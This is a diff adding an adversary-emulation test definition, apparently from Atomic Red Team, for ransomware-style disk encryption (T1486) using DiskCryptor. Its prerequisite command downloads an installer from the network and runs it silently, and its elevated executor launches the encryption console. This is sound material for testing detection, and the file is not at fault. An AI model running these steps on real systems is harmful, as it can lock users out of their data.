@@ -1,0 +1,37 @@
+{
+    "name": "Data Encrypt Using DiskCryptor",
+    "description": "DiskCryptor, an open source encryption utility, can be exploited by adversaries for encrypting all disk partitions, including system partitions. This tool was identified in a ransomware campaign, as reported on https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/. The documentation for DiskCryptor can be found at https://github.com/DavidXanatos/DiskCryptor. During the installation process, running dcrypt.exe starts the encryption console. It's important to note that a system reboot is necessary as part of the installation. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "command": "\"\"%PROGRAMFILES%\\dcrypt\"\\#{dcrypt_exe}\"\n",
+        "type": "Command Executor"
+    },
+    "id": "T1486",
+    "tactics": [
+        "Impact"
+    ],
+    "technique": "Data Encrypted for Impact",
+    "source": "ART",
+    "uuid": "44b68e11-9da2-4d45-a0d9-893dabd60f30",
+    "arguments": {
+        "dcrypt_exe": {
+            "description": "The dcrypt.exe executable from dcrypt_setup.exe",
+            "type": "path",
+            "default": "dcrypt.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "dcrypt_setup will be installed at specified location (#{dcrypt_exe})\n",
+            "prereq_command": "if (Test-Path \"${env:ProgramFiles}/dcrypt/#{dcrypt_exe}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Write-Host Downloading DiskCryptor installer\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/DavidXanatos/DiskCryptor/releases/download/1.1.846.118/dcrypt_setup_1.1.846.118.exe\" -OutFile      \"PathToAtomicsFolder\\..\\ExternalPayloads\\dcrypt_setup_1.1.846.118.exe\"\nWrite-Host Install DiskCryptor\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\dcrypt_setup_1.1.846.118.exe\" -Wait -ArgumentList \"/s\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
